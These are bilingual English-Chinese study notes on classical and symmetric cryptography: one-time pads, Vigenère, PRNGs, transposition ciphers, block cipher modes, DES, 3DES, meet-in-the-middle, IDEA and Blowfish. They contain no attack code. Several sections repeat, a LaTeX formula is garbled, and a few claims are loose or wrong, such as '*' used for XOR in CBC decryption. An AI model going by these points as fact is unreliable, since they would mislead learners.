  - the first letter in a pair would specify a row
  - the second letter in a pair would specify a column
  - and each entry would be the unique two-letter substitution to use for this pair.
using an S-box to encode a substitution cipher, can be extended to binary words.
example:
  - word x (b-bit)
  - divide it into two words, y (c bits) and z (d bits)
  - b = c + d.
  - Then we could specify the substitution to use for such a word, x, by using an S-box of dimensions 2c × 2d. Figure 3. Note that as long as the substitutions specified in an S- box, S, are unique,
  - then there is an inverse S-box, S−1, that can be used to reverse the substitutions specified by S.
  - A 4-bit S-box in binary and in decimal
⁃
In addition to single-letter frequencies, the frequencies of all digram combinations are easy to compute for any alphabet-based written language, given a large enough corpus. Thus, a cryptosystem based only on simple single-character or digram substitution is insecure.
One-Time Pads (OTP)
理论上，此密码具有完善保密性，是牢不可破的。
- when properly used, a onetime pad cannot be cracked.
- 它的安全性已由克劳德·艾尔伍德·香农所证明。
虽然它在理论上的安全性无庸置疑，但在实际操作上却有着以下的问题:
- 用以加密的文本/一次性密码本，必须随机产生的。
- 它至少必须和被加密的文件等⻓。
- 用以加密的文本只能用一次，且必须对非关系人小心保密，不再使用
   时，用以加密的文本应当要销毁，以防重复使用。
- Caesar cipher, Vigenère cipher, and one-time pad very similar. The only difference is the key length.
  - The Caesar shift cipher uses a key of length one, 3,234

  - the Vigenère cipher uses a longer key (usually a word or sentence),
  - the one- time pad uses a key that is as long as the message itself.
one-time pad.
One-time pads have been used throughout history to protect extremely sensitive communications. The major obstacle to their widespread use is the difficulty of generating, distributing, and safeguarding the lengthy keys required. One-time pads can realistically be used only for short messages, because of key lengths.
substitution cipher, absolutely unbreakable(when used properly).
use a different substitution alphabet for each letter of the plaintext message.
invented in 1917 by Joseph Mauborgne and Gilbert Vernam. One-time pads are also known as Vernam ciphers.
apply the same approach as with the Vigenere cipher
The encryption function, K is the encryption key, C = (P + K) mod 26
use a block of keys, (k1, k2, . . . , km), length, m, to encrypt a plaintext, M, of length n, but with two critical differences.
  - 1. The length of the block of keys has to be the same as the length of the plaintext. This is because each character of the key is used to encode only one character of the message.
  - 2. Each shift amount, ki, must be chosen completely at random. The
one-time pad must be randomly generated. Using a phrase or a passage from a book would introduce the possibility that cryptanalysts could break the code.
  - 3. The one-time pad must be physically protected against disclosure. If the enemy has a copy of the pad, they can easily decrypt the enciphered messages.
  - Each one-time pad must be used only once. With these rules, no statistical analysis that can be applied to a ciphertext.
  - each shift amount is chosen at random,
  - each letter of the alphabet is equally likely to appear at any place in the ciphertext.
  - every letter of the alphabet is equally likely to have produced any given letter in the ciphertext.
  - no repeating pattern of alphabetic substitution, rendering cryptanalytic efforts useless.
  - Then absolutely unbreakable.
Because of its security, it is widely reported that the hotline connecting Moscow and Washington, D.C., during the Cold War was encrypted using a one-time pad.
as no one reveals the pads—the sequence of random shifts that were used in one- time pad encryptions—the messages that were sent will be secret forever.
But when pads are reused,
  - the security of the messages is quickly reduced, since it allows for statistical methods to be used to discover parts of the plaintext.
  - one-time use is hard to achieve, the pad length has to be as long as the message.
  - encrypting a long conversation using a one-time pad, may runs out of pad.
people attempt to implement a one-time pad cryptosystem but fail to meet one or more of these funda- mental requirements. an example of how an entire Soviet code system was broken because of carelessness in this area. during the Cold War. the Soviet Union communicated with its spies using one- time pads, but that these pads were sometimes reused by desperate spies who had used up all the pages of pad in their code books.
Anticipating that such reuse would occur, the U.S. government initiated an effort, called the Venona Project, to perform analyses of intercepted traffic between the Soviet Union and its spies. Discovered a pattern in the way the Soviets generated the key values used in their pads. After this pattern was discovered, much of the code was eventually broken.
  - The Venona Project was highly successful, in fact, because a significant amount of pad reuse actually did occur in the field, since the one-time pad is impractical.
Binary One-Time Pads
In spite of its impracticality, some principles of the one-time pad are used in other, more-practical cryptosystems.
In particular, there is a binary version of the one-time pad
an elegant interpretation using the binary exclusive-or (XOR) operation.
This operation is used in most modern cryptosystems similarly to how it is used in a binary version of the one-time pad cryptosystem.
the exclusive-or (XOR) operator:
  - applied to two bits, a and b,
  - yields 1 if a and b are different,
  - yields 0 if a and b are the same.
In the binary one-time pad, we view the plaintext message, M, as being a binary string of length n. Likewise, we view the pad, P, to be a completely random binary string of length n. produce the ciphertext, C, using the formula
  - C = M ⊕ P,
where we make the common notational use of ⊕ here to denote the XOR
operator applied bitwise to two equal-length binary strings.
Like its letter-based counterpart, the binary one-time pad is absolutely
unbreakable,
  - because each bit of the ciphertext is equally likely to be a 0 or 1,
independent of the plaintext and the other bits of the ciphertext.
  - In addition, given the pad P it is easy to recover the plaintext from the ciphertext, using the formula
  - M=C⊕P.
Indeed, since XOR is associative, we have
  - C⊕P = (M⊕P)⊕P = M⊕(P⊕P) = M⊕⃗0 = M.
  - Where 0⃗ denotes a vector of all zero bits.
Thus, in a binary one-time pad cryptosystem, the pad P is used directly for both encryption and decryption.
Vigenere cipher:
- a polygraphic substitution cipher
- applies to blocks of length m:   - It amounts to repeatedly using m shift ciphers in parallel.
  - key in this cryptosystem is a sequence of m shift amounts, (k1,
k2, . . . , km)
- Given a block of m characters of plaintext,
- we encrypt the block by cyclically shifting the first character by k1, the second by k2, the third by k3, and so on.
- Thus, there are potentially m different substitutions for any given letter in the plaintext (depending on where in the plaintext the letter appears), making this a type of polygraphic substitution cipher.
- Decryption is done by performing the reverse shifts on each block of m characters in the ciphertext.
But the Vigenere cipher can be easily broken using statistical techniques, as long as the ciphertext is long enough relative to the value of m.
- Vigenère cipher uses a single encryption/decryption chart:  ⁃
- You need a key to use the Vigenère system.
 ⁃
- Then, you would perform the following encryption process: - Write out the plain text.
- write out the encryption key, repeating the key as many times as needed to establish a line of text that is the same length as the plain text.
- Convert each letter position from plain text to ciphertext.
a. Locate the column headed by the first plaintext character (a).
b. locate the row headed by the first character of the key (s). 从上往 下开始数A-Z，数到S。
c. Finally, locate where these two items intersect, and write down the letter that appears there (s).
d. This is the ciphertext for that letter position.
- Repeat steps 1 through 3 for each letter in the plaintext version.
Although polyalphabetic substitution protects against direct frequency analysis, it is vulnerable to a second-order form of frequency analysis period analysis, an examination of frequency based on the repeated use of the key.
Pseudo-Random Number Generators
密码学安全伪随机数生成器
Randomness is a precious resource, as the historical experience with the one-time pad shows. Ignoring the philosophical 哲学上的 argument about whether “true” randomness really exists, and sticking to the practical problem of how to gather unpredictable bits, getting a computer or other digital device to generate random numbers is relatively expensive. Current techniques involve sampling subatomic processes whose unpredictability is derived from quantum mechanics or sampling environmental phenomena, such as user input variations, wind noise, or background radiation coming from outer space. None of these techniques are cheap or fast, from a computer’s perspective.
Moreover, even with these sources of unpredictability, it is not easy to turn any of these sources into uniformly distributed, unbiased sequences of numbers or bits, such as is needed for the one-time pad.
Randomness is useful for such things as secret keys. We can perform such expansion of randomness by using pseudo-random number generator (PRNG):
a method for generating a sequence of numbers that approximates the properties of a random sequence.
Middle square method:
- seed 1234 - square 1522756 - 8digit 01522756
- - middle four digit (new seed) 01522756 - square .....
Hard to be always random, usually has pattern.
The Linear Congruential Generator
A desirable property of a random sequence is that the numbers it generates are uniformly distributed.
One way to achieve this property is to use a method employed, for instance, by the java.util.Random class in Java, which is a linear congruential generator.
In this PRNG, we start with a random number, x0, the seed, and generate the next number, xi+1, in a sequence, from the previous number, xi, according to the
following formula:
  - xi+1 = (axi + b) mod n.
  - Mutiplier a, increment c, modules n.
  - a > 0, b ≥ 0 chosen at random from the range [0, n − 1], the range of generated numbers. If a and n are relatively prime, then one can prove that the generated sequence is uniformly distributed.
For instance, if n itself is prime, then this PRNG will be uniform, which approximates an important property of a random sequence.
For cryptographic purposes, the linear congruential generator produces a sequence of numbers that is insufficient as a random sequence however.
Security Properties for PRNG’s
In cryptographic applications, we desire pseudo-random number generators with additional properties that the linear congruential 同余 generator does not have. For instance, it should be hard to predict xi+1 from previous numbers in the sequence.
With the linear congruential generator, it is easy to determine the values of a, b as soon as we have seen three consecutive numbers, and, from that point on, an adversary can predict every number that follows.
Another desired property for a pseudo-random sequence concerns its period. Since a pseudo-random sequence is generated deterministically 确定性 from a
random seed, there will be a point where the sequence starts repeating itself. The number of values outputted by the sequence before it repeats is known as its
period.
For instance, if a is relatively prime to n, then the period of a linear congruential
generator is n.
A More Secure PRNG
There are several PRNGs that are believed to be cryptographically secure.
example, a PRNG more secure than the linear congruential generator is one that takes a secure encryption algorithm, like the Advanced Encryption Standard (AES) algorithm (which operates on fixed-length plaintext blocks) and uses it to encrypt, using a common random key, each number in a deterministic sequence of numbers that starts from a random seed. This sequence could even be a consecutive set of
 integers, as long as it starts from a random seed.
Breaking the predictability 可预言 of such a sequence amounts to a type of ciphertext-only attack, where the adversary knows that the associated plaintexts are taken from a known sequence.
The period of this PRNG is equal to 2n, n is the the block size.
Thus, such a PRNG is much more secure than the linear congruential generator.
Given a secure PRNG, we can use it for encryption and decryption, by making its seed be a secret key, K, and performing an exclusive-or of the sequence of pseudo- random numbers with the plaintext message, M, to produce a ciphertext, as with the one-time pad.
Even so, just as with the one-time pad, we should only perform an encryption only once for any given key, K, and the length of plaintext should be much smaller than the period for the PRNG. Otherwise, the security would be weak like reusing a one-time pad.
For this reason, such an encryption scheme is best restricted for use as a stream cipher, encrypt a single stream of bits or blocks.
Stream ciphers where previously discussed in the context of encryption methods for wireless networks.
Running Key Ciphers
Many cryptographic vulnerabilities surround the limited length of the cryptographic key.
one-time pads avoid these vulnerabilities by using a key that is at least as long as the message. But one-time pads are awkward to implement because they need physical exchange of pads. One common solution to this dilemma is the use of a running key cipher / book cipher.
In this cipher, the encryption key is as long as the message itself, often chosen from a common book.
Example:
the sender and recipient agree in advance to use the text of a chapter from Moby
Dick, beginning with the third paragraph, as the key.
They would both simply use as many consecutive characters as necessary to
perform the encryption and decryption operations.
encrypt the message “Richard will deliver the secret package to Matthew at the
bus station tomorrow”, 66 characters in length.
so use the first 66 characters of the running key: “With much interest I sat
watching him. Savage though he was, and hideously marred.”
Any algorithm could then be used to encrypt the plaintext message using this key.
Let’s look at the example of modulo 26 addition:
If you assign the letter A the value 0 and the letter Z the value 25 converts each letter to a decimal equivalent,
adds the plain text to the key
Performs modulo 26 to yield the ciphertext.  Transposition Ciphers
use an encryption algorithm to rearrange the letters of a plaintext message, forming the ciphertext message.
The decryption algorithm: simply reverses the encryption transformation to retrieve the original message.
In the challenge-response protocol example:
 a simple transposition cipher was used, reverse the the message so apple became elppa. Transposition ciphers can be much more complicated:
you can use a keyword to perform a columnar transposition. example:
  - attempting to encrypt the message “The fighters will strike the enemy bases at noon” using the secret key attacker.
  - Our first step is to take the letters of the keyword and number them in alphabetical order.
  - The first appearance of the letter A receives the value 1; the second appearance is numbered 2. The next letter in sequence, C, is numbered 3, and so on.
  - This results in the following sequence:
  - A T T AC K E R = 1 7 8 2 3 5 4 6
  - Next, the letters of the message are written in order underneath the letters of the keyword:
⁃
  - Finally, the sender enciphers the message by reading down each
 column;
  - the order in which the columns are read corresponds to the numbers assigned in the first step. This produces the following ciphertext:
  - TETEE F WK M TI I EY N H LH A O G L TB O TS ES N H R R N S ES I EA
  - On the other end, the recipient reconstructs the eight-column matrix using the ciphertext and the same keyword and then simply reads the plaintext message across the rows.
exclusiveor XOR 异或
- 两个相同的数进行XOR 结果为0。
- 对同一个比特序列进行两次XOR之后就会回到最初的状态，与加密解
密的步骤相似
  - 1 xor 0 = 1 xor 0 = 1
  - 0 xor 1 = 0 xor 1 = 1
  - 0 xor 0 = 0 xor 0 = 0
  - 1 xor 1 = 1 xor 1 = 0
 0 OR 0 = 0
1 OR 0 = 1
0 OR 1 = 1
1 OR 1 = 1
 0 AND 0 = 0
1 AND 0 = 0
0 AND 1 = 0
1 AND 1 = 1 Block Ciphers
- In a block cipher:
  - Plaintext and ciphertext have same fixed length b (e.g., 128 bits)
  - A plaintext of length n is partitioned into a sequence of m blocks/chunks.
  - P[0], ..., P[m-1], n < bm < n + b
- encrypts data in specific-sized blocks
  - divides large files or messages into these blocks
  - encrypts each individual block separately.
- Each message is divided into a sequence of blocks and encrypted or decrypted in terms of its blocks.
  - The transposition ciphers: the simple algorithm used in the challenge- response algorithm takes an entire word and reverses its letters.
  - The more complicated columnar transposition cipher works on an entire message (or a piece of a message) and encrypts it using the transposition algorithm and a secret keyword.
 Padding
Block ciphers require the length n of the plaintext to be a multiple of the block size b. Padding the last block needs to be unambiguous 明确的 (cannot just add zeroes)
When the block size and plaintext length are a multiple of 8, a common padding method (PKCS5) is a sequence of identical bytes, each indicating the length (in bytes) of the padding
Example:
  - for fixed length b = 128 (16 bytes)
  - Plaintext: “Roberto” (7 bytes)
  - Padded plaintext: “Roberto999999999” (16 bytes), where 9 denotes the
number and not the character
We need to always pad the last block, which may consist only of padding Block ciphers can be executed in several different modes of operation: Electronic Code Book (ECB). Easiest
- use the algorithm without any modification. implement the algorithm exactly as it is designed.
- divide the plaintext into blocks and then encrypt each block using the same key.
  - a significant weakness.
  - If plaintext is the same, the ciphertext is the same, easier to crack.
- not recommended for any cryptographic today.
- Example:
- DES, AES, Blowfish, GOST... divide the plain text into blocks (often 64-bit or 128-bit) and encrypt each block, one at a time.
cipher-block chaining (CBC). quite commonly used
- used by some symmetricblock ciphers.
- It uses an IV for randomization when encrypting the first block. It then combines each subsequent block with the previous block using an XOR operation.
  - the output of the first block XOR’d with the plain text of the next block. This causes two interesting improvements in the cipher.
- Because encryption of each block is dependent on the encryption of all previous blocks,
- Weakness: CBC sometimes suffers from pipeline delays, making it less efficient than some other modes. - Benefit:
  - introduces even more diffusion.
  - makes known plain-text attacks totally ineffective. even if every single block of plain text were identical, the outputs would be different.
Counter mode (CTM or CTR):
- convert a block cipher into a stream cipher.
- It basically works by generating a keystream block by encrypting sequential values of some counter. This counter can be any function that produces a sequence that has a long period with no repetition.
- It combines an IV with a counter and uses the result to encrypt each plaintext block. Each block uses the same IV, but CTM combines it with the counter value, resulting in a different encryption key for each block.
- Multiprocessor systems can encrypt or decrypt multiple blocks at the same time, allowing the algorithm to be quicker on multiprocessor or multicore systems.
- CTM is widely used and respected as a secure mode of operation.
Galois Counter Mode (GCM): more complex
- a mode of operation used by many block ciphers.
- It combines the Counter mode of operation with the Galois mode of authentication.
  - uses a hash function of a binary Galois field to provide encryption that is authenticated.
  - In normal counter mode, each block is encrypted with a cipher in a sequential manner to produce a stream cipher.   - The GCM uses a Galois field with a hash to have an authenticated cipher.
- Note that it doesn’t authenticate users or systems, but instead provides data
authenticity (integrity) and confidentiality.
  - encrypting the data for confidentiality
  - hashing techniques for integrity.
- provides both data integrity and confidentiality
- It is widely used due to its efficiency and performance, allowing systems to quickly encrypt and decrypt data.
CCM mode/CBC-MAC:
- an authenticated encryptionalgorithm designed to provide
both authentication and confidentiality.
  - only defined for block ciphers with a block length of 128 bits.
  - The nonce of CCM must be carefully chosen to never be used more than once for a given key. This is because CCM is a derivation
of CTR mode and the latter is effectively a stream cipher.
  - CCM mode combines the well known CBC-MAC with the well known counter mode of encryption.
  - These two primitives are applied in an "authenticate-then-encrypt" manner, that is,
  - CBC-MAC is first computed on the message to obtain a tag t;
  - the message and the tag are then encrypted using counter mode.
  - One key insight is that the same encryption key can be used for both, provided that the counter values used in the encryption do not collide with the (pre-)initialization vectorused in the authentication.
  - A proof of security exists for this combination, based on the security of the underlying block cipher. The proof also applies to a generalization of CCM for any size block cipher, and for any
size cryptographically strong pseudo-random function (since in both
   counter mode and CBC-MAC, the block cipher is only ever used in one direction).
Electronic CodeBook (ECB) Mode:
Simplest Block Cipher
Block P[i] encrypted into ciphertext block C[i] = EK(P[i]) Block C[i] decrypted into plaintext block M[i] = DK(C[i])
use the algorithm without any modification at all.
Essentially, you implement the algorithm exactly as it is designed.
  Each time the algorithm processes a 64-bit block, simply encrypts the block using the chosen secret key. This means that if the algorithm encounters the same block multiple times, it will produce the same encrypted block.
If eavesdropping on the communications, could simply build a “code book” of all the possible encrypted values.
After a sufficient number of blocks were gathered, cryptanalytic techniques could be used to decipher some of the blocks and break the encryption scheme.
This vulnerability makes ECB mode been uesed on the shortest transmissions.
ECB is used only for exchanging small amounts of data,
  - Like keys and parameters used to initiate other DES modes as well as the cells in a database.
Strengths:
  - very simple
  - Allows for parallel encryptions of the blocks of a plaintext
  - Can tolerate the loss or damage of a block Weakness:
  - Documents and images are not suitable for ECB encryption
  - patterns in the plaintext are repeated in the ciphertext:
⁃
 Cipher Block Chaining (CBC) Mode
Block Cipher, the previous ciphertext block is combined with the current plaintext block:
Encryption: each block plain text XOR with the block of ciphertext immediately preceding it before it is encrypted using the DES algorithm.
V = C[-1], a random block separately transmitted encrypted (the initialization vector).
Decryption: process simply decrypts the ciphertext and reverses the XOR operation.
P[3] = C[2] * Dkey (C[3])
    The IV must be sent to the recipient, perhaps by tacking the IV onto the front of the completed ciphertext in plain form or by protecting it with ECB mode encryption using the same key used for the message.
Strengths:
  - Doesn’t show patterns in the plaintext
  - Is the most common mode
  - Is fast and relatively simple
Weaknesses:
  - Requires the reliable transmission of all the blocks sequentially
  - not suitable for applications that allow packet losses (e.g., music and
video streaming)
  - errors propagate: if one block is corrupted during transmission, it becomes impossible to decrypt that block and the next block as well.
 IV: Pseudo-random data used in combination with a secret key in WEP and SSL encryption schemes. Cipher Feedback Mode
Cipher Feedback (CFB) mode is the streaming cipher version of CBC.
In other words, CFB operates against data produced in real time.
However, instead of break message into blocks, it uses memory buffers of the same block size.
As the buffer becomes full, it is encrypted and then sent to the recipient(s).
Then the system waits for the next buffer to be filled as the new data is generated before it is in turn encrypted and then transmitted.
Other than the change from preexisting data to real-time data, CFB operates in the same fashion as CBC, uses an IV and chaining.
Output Feedback Mode
In Output Feedback (OFB) mode:
DES operates in almost the same fashion as it does in CFB mode.
instead of XORthe previous block of ciphertext, XORs the plain text with a seed value.
  - For the first encrypted block, an initialization vector IV is used to create the seed value.
  - Future seed values are derived by running the DES algorithm on the previous seed value.
Major advantages: no chaining function, transmission errors do not propagate to affect the decryption of future blocks. Counter Mode
DES that is run in Counter (CTR) mode
uses a stream cipher similar to that used in CFB and OFB modes.
However, instead of creating the seed value for each encryption/decryption operation from the results of the previous seed values, it uses a simple counter that increments for each operation.
As with OFB mode, errors do not propagate in CTR mode.
CTR mode allows to break an encryption/decryption operation into multiple
independent steps.
This makes CTR mode well suited for use in parallel computing.
Block Cipher Modes
describes the way a block cipher encrypts and decrypts a sequence of message blocks.
Electronic CodeBook (ECB) Mode:
Simplest Block Cipher
Block P[i] encrypted into ciphertext block C[i] = EK(P[i]) Block C[i] decrypted into plaintext block M[i] = DK(C[i])   Each time the algorithm processes a 64-bit block, it simply encrypts the block using the chosen secret key.
This means that if the algorithm encounters the same block multiple times, it will produce the same encrypted block.
If eavesdropping on the communications, could simply build a “code book” of all the possible encrypted values.
After a sufficient number of blocks were gathered, cryptanalytic techniques could be used to decipher some of the blocks and break the encryption scheme.
This vulnerability makes ECB mode been uesed on the shortest transmissions. ECB is used only for exchanging small amounts of data,
such as keys and parameters used to initiate other DES modes as well as the cells in a database.
Strengths:
  - very simple
  - Allows for parallel encryptions of the blocks of a plaintext
  - Can tolerate the loss or damage of a block Weakness:
  - Documents and images are not suitable for ECB encryption since patterns in the plaintext are repeated in the ciphertext:
Cipher Block Chaining (CBC) Mode
Block Cipher, the previous ciphertext block is combined with the current plaintext block:
Encryption: each block plain text XOR with the block of ciphertext immediately preceding it before it is encrypted using the DES algorithm.
  V = C[-1], a random block separately transmitted encrypted (the initialization vector).
Decryption: process simply decrypts the ciphertext and reverses the XOR operation.
P[3] = C[2] * Dkey (C[3])
  The IV must be sent to the recipient, perhaps by tacking the IV onto the front of the completed ciphertext in plain form or by protecting it with ECB mode encryption using the same key used for the message.
Strengths:
  - Doesn’t show patterns in the plaintext
  - Is the most common mode
  - Is fast and relatively simple
Weaknesses:
  - Requires the reliable transmission of all the blocks sequentially
  - not suitable for applications that allow packet losses (e.g., music and
video streaming)
  - errors propagate: if one block is corrupted during transmission, it becomes impossible to decrypt that block and the next block as well. Cipher Feedback Mode
Cipher Feedback (CFB) mode is the streaming cipher version of CBC.
In other words, CFB operates against data produced in real time.
However, instead of break message into blocks, it uses memory buffers of the same block size.
As the buffer becomes full, it is encrypted and then sent to the recipient(s).
Then the system waits for the next buffer to be filled as the new data is generated before it is in turn encrypted and then transmitted.
Other than the change from preexisting data to real-time data, CFB operates in the same fashion as CBC, uses an IV and chaining.
Output Feedback Mode
In Output Feedback (OFB) mode:
DES operates in almost the same fashion as it does in CFB mode.
However, instead of XOR an encrypted version of the previous block of ciphertext, DES XORs the plain text with a seed value.
For the first encrypted block, an initialization vector IV is used to create the seed value.
Future seed values are derived by running the DES algorithm on the previous seed value.
Major advantages of OFB mode: no chaining function, transmission errors do not propagate to affect the decryption of future blocks. Counter Mode
DES that is run in Counter (CTR) mode
uses a stream cipher similar to that used in CFB and OFB modes.
However, instead of creating the seed value for each encryption/decryption operation from the results of the previous seed values, it uses a simple counter that increments for each operation.
As with OFB mode, errors do not propagate in CTR mode.
CTR mode allows to break an encryption/decryption operation into multiple independent steps. This makes CTR mode well suited for use in parallel computing.
Block Ciphers
- Symmetric encryption algorithm recommended by the U.S. National Institute of Standards and Technology (NIST):
Data Encryption Standard (DES)
– Developed by IBM and adopted by NIST in 1977
– 64-bit blocks and 56-bit keys, weak as today’s standards.
– Small key space makes exhaustive search attack feasible since late 90s
Triple DES (3DES) late 1990s,
  - Nested application of DES with three different keys KA, KB, and KC,
  - three 56-bit DES keys (total 168 bits), a strong encryption algorithm.
  - Effective key length is 168 bits, making exhaustive search attacks
unfeasible
  - C = EKC(DKB(EKA(P)));
  - P = DKA(EKB(DKC(C)))
  - Equivalent to DES when KA=KB=KC (backward compatible) ▸ 3 keying options:
- 3 keys are different (keying option 1);
- 2 keys are the same (keying option 2);
- 3 keys are the same (keying option 3) to maintain backwards
compatibility with DES.
- Advanced Encryption Standard (AES)
– Selected by NIST in 2001 through open international competition and public discussion
– 128-bit blocks and several possible key lengths: 128, 192 and 256 bits
– Exhaustive search attack not currently possible
– AES-256 is symmetric encryption algorithm. Same key.
– typically considered the preferred symmetric encryption algorithm.
  Data Encryption Standard
The US government published the Data Encryption Standard in 1977 as a proposed standard cryptosystem for all government communications. was developed in response to the National Bureau of Standards (NBS)/National Institute of Standards and Technology (NIST), issuing a request for proposals for a standard cryptographic algorithm in 1973.
- Due to flaws in the algorithm, cryptographers no longer consider DES secure, DES已能被暴力破解
- DES was superseded by the Advanced Encryption Standard in December 2001.
- It is still important to understand DES because it is the building block of Triple DES (3DES).
DES:
- It encrypts data in 64- bit blocks. 64 bits of plain text generate 64-bit of ciphertext.   - considered adequate to resist a brute-force attack for up to 90 years.
  - but now small 56 bits key and can be broken with brute force in
minutes.
⁃
- DES uses a long series of exclusive OR (XOR) operations to generate the ciphertext.
- This process is repeated 16 times for each encryption/decryption operation. Each repetition is commonly referred to as a round of encryption, explaining the statement that DES performs 16 rounds of encryption.
DES uses a 56-bit key to drive the encryption and decryption process. However, you may read in some literature that DES uses a 64-bit key. This is not an
inconsistency矛盾, logical explanation:
- The DES specification calls for a 64-bit key.
  - only 56 bits actually contain keying information.
  - remaining 8 bits contain parity information to ensure that the other 56 bits are accurate. 每7个比特会设置一个用于错误检查的比特，因 此实质上其密钥⻓度是56比特。
- In practice, however, those parity bits are rarely used.
- You should commit the 56-bit figure to memory.
DES is a 64-bit block cipher that has 5 modes of operation: Electronic Codebook (ECB) mode,
Cipher Block Chaining (CBC) mode,
Cipher Feedback (CFB) mode,
Output Feedback (OFB) mode, Counter (CTR) mode. Data Encryption Standard - DES
- was developed in response to the National Bureau of Standards (NBS), now
known as the National Institute of Standards and Technology (NIST), issuing a request for proposals for a standard cryptographic algorithm in 1973.
- NBS specified that the DES standard had to be recertified every five years. While DES passed without a hitch in 1983, the NSA said it would not recertify it in 1987. However, since no alternative was available for many businesses, many complaints ensued, and the NSA and NBS were forced to recertify it. The algorithm was then recertified in 1993.
- The kayspace is too small.
- NIST has now certified the Advanced Encryption Standard (AES) to
replace DES.
- DES是一种将64比特的明文加密成64比特的密文的对称密码算法，它的 密钥⻓度是56比特。尽管从规格上来说，DES的密钥⻓度是64比 特，但由于每个7比特会设置一个用于错误检查的比特，因此实质上 其密钥⻓度是56比特。
- DES已经能够被暴力破解，因此现在不应该再使用DES了
- DES的结构(Feistel网络)
◦ 第一轮中“右侧”根本就没有被加密，因此需要用不同的子密钥对一 轮的处理重复若干次，并在每两轮处理之间将左侧和右侧的数据 对调，用相同的子密钥运行两次Feistel网络就能够将数据还原
- Feistel网络的性质: •Feistel网络的轮数可以任意增加 •加密时无论使用任何函数作为轮函数都可以正确解密 •加密和解密可以用完全相同的结构来实现 Triple DES
the Data Encryption Standard 56-bit key is no longer considered adequate in the face of modern cryptanalytic techniques and supercomputing power.
- a symmetric block cipher
- Improve he known weaknesses of DES.
- uses the same algorithm to produce a more secure encryption. multiple encryption.
- In basic terms, it encrypts data using the DES algorithm in three separate passes and uses multiple keys.
  - Just as DES encrypts data in 64-bit blocks, 3DES also encrypts data in 64-bit blocks.
- Although 3DES is a strong algorithm, it isn’t used as often as AES today.
  - AES is much less resource intensive.
  - if hardware doesn’t support AES, 3DES is a suitable alternative.
  - 3DES uses key sizes of 56 bits, 112 bits, or 168 bits.
There are 4 versions of 3DES:
- DES-EEE3 mode: simply encrypts the plain text 3 times, using 3 different
keys: K1, K2, K3. (the Es indicate that there are three encryption operations, 3 indicates 3 different keys are used).   - E(K1,E(K2,E(K3,P)))
  - effective key length 168 bits.
- DES-EDE3 mode: uses 3 keys but replaces the second encryption operation with a decryption operation:
  - E(K1,D(K2,E(K3,P)))
  - effective key length 168 bits.
- DES-EEE2 mode: uses 2 keys, K1, K2:
  - E(K1,E(K2,E(K1,P)))
  - effective key length 112 bits.
- DES-EDE2 mode: also 2 keys but uses a decryption operation in the middle:
  - E(K1,D(K2,E(K1,P)))
  - effective key length 112 bits.
- Technically, fifth variant, DES-EDE1 mode: uses only 1 key. However, it results in the same algorithm as standard DES, which is unacceptably weak for most applications. It is provided only for backward-compatibility purposes.
These four variants of 3DES, the current belief is that all modes are equally secure.
what happened to Double DES (2DES)? You’ll read in Chapter 7 that Double DES was tried but quickly abandoned when it was proven that an attack existed that rendered it no more secure than standard DES.  The additional security, however. It can take up to 3 times longer to compute 3DES than DES. However, the advances in memory and processing power in today’s electronics make this problem irrelevant in all devices except for very small low- power handhelds. ▪


## The only weaknesses of 3DES:
- those that already exist in DES.
Strength:
- Because different keys are used with the same algorithm, the effective key length is longer than DES keyspace and this results in greater resistance to brute-force attack, making 3DES stronger than DES to a wide range of attacks.
- While 3DES has continued to be popular and is still widely supported, AES has taken over as the symmetric encryption standard.
- 当三重DES中所有的密钥都相同时，3DES等于普通DES。
▸ 这是因为在两步加密、解密之后，得到的就是最初的明文。
▸ 因此，以前用DES加密的密文，就可以通过这种方式用三重DES来进行
解密，也就是说三重DES对DES具备向下兼容性。
▸ 三重DES现状:尽管3DES目前还被银行等机构使用，但其处理速度不
高，而且在安全性方面也逐渐显现出了一些问题。
 中途相遇攻击
Meet-in-the-middle attack
     密码学上以空间换取时间的一种攻击。
 ▪


## 在1977年就由惠特菲尔德·迪菲(Diffie)与⻢丁·赫尔曼 (Hellman)提出
One known plaintext attacks. The intruder has to know some parts of plaintext and their ciphertexts.
Using meet-in-the-middle attacks it is possible to break ciphers, which have two or more secret keys for multiple encryption using the ame algorithm.
example, the 3DES cipher works in this way.
Meet-in-the-middle attack was first presented by Diffie and Hellman for cryptanalysis of DES algorithm.
原理
一维中途相遇攻击
假设ENC是加密函式，DEC是解密函式，也就是ENC^{-1}，而 k_1与k_2为两次加密用的秘钥，则可以推导出:
C=ENC_k_2(ENC_k_1(P))
P=DEC_{k_{1}}(DEC_{k_{2}}(C))\\\Rightarrow ENC_{k_{1}}
(P)&=DEC_{k_{2}}(C)\end{aligned}}} {\displaystyle {\begin{aligned} C&=ENC_{k_{2}}(ENC_{k_{1}}(P))\\P&=DEC_{k_{1}}(DEC_{k_{2}}(C))\\ \Rightarrow ENC_{k_{1}}(P)&=DEC_{k_{2}}(C)\end{aligned}}} 当攻击者已知 明文 {\displaystyle P} P与密文 {\displaystyle C} C时，攻击者可以穷举所有 {\displaystyle k_{1}} k_1的组合，将产生出来的第一层密文 {\displaystyle ENC_{k_{1}}(P)} {\displaystyle ENC_{k_{1}}(P)}，用大量空间储存下来。再穷 举所有 {\displaystyle k_{2}} k_2的组合，将 {\displaystyle DEC_{k_{2}}(C)} {\displaystyle DEC_{k_{2}}(C)}的值与前面储存下来的结果比对，进而得出正
       确的 {\displaystyle k_{1}} k_1与 {\displaystyle k_{2}} k_2。 这使得攻击者计 算的量从 {\displaystyle k_{1}} k_1与 {\displaystyle k_{2}} k_2各自的可能组 合数相乘，变成相加。 这也是为什么三重资料加密算法(3DES)使用了三 把56 bits的秘钥(168 bits)，却只有两把秘钥的强度(112 bits)。
International Data Encryption Algorithm
The International Data Encryption Algorithm (IDEA) 国际数据加密算法 block cipher was developed in response to complaints about the insufficient key length of the DES algorithm.
- Like DES, 64-bit blocks of plain text/ciphertext.
- However, operation with a 128-bit key. This key is broken up in a series of
operations into 52 16-bit subkeys.
- The subkeys then act on the input text using a combination of XOR and modulus operations to produce the encrypted/decrypted version of the input message.
- IDEA can operate in same 5 modes used by DES: ECB, CBC, CFB, OFB, and CTR.
The IDEA algorithm is patented by its Swiss developers. However, they have granted an unlimited license to anyone who wants to use IDEA for noncommercial purposes. One popular implementation of IDEA is found in Phil Zimmerman’s popular Pretty Good Privacy (PGP) secure email package.  Blowfish
- Bruce Schneier: to replace DES.
- strong symmetric block cipher still widely used today.
- another alternative to DES and IDEA.
- encrypts data in 64-bit blocks of text.
- supports key sizes between 32 and 448 bits.
